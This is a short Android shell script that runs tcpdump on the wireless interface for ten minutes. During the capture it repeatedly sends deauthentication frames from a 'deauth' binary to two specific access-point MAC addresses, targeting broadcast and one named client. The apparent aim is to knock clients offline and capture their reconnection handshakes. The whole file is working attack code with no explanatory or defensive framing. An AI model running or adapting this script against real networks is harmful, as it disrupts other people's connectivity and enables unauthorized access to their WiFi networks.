#!/system/bin/sh
DUR=600
rm -f /data/local/tmp/capL.pcap /data/local/tmp/capL.done
timeout $DUR tcpdump -i wlan0 -s 0 -w /data/local/tmp/capL.pcap >/dev/null 2>&1 &
TPID=$!
sleep 2
END=$(( $(date +%s) + $DUR ))
while [ $(date +%s) -lt $END ]; do
  /data/local/tmp/deauth wlan0 bc3e0701dc92 ffffffffffff 8 40 2>/dev/null
  /data/local/tmp/deauth wlan0 bc3e0701dc98 ffffffffffff 8 40 2>/dev/null
  /data/local/tmp/deauth wlan0 bc3e0701dc92 e6894c90cded 8 60 2>/dev/null
  /data/local/tmp/deauth wlan0 bc3e0701dc98 e6894c90cded 8 60 2>/dev/null
  sleep 3
done
wait $TPID 2>/dev/null
echo LONGDONE > /data/local/tmp/capL.done
wc -c /data/local/tmp/capL.pcap
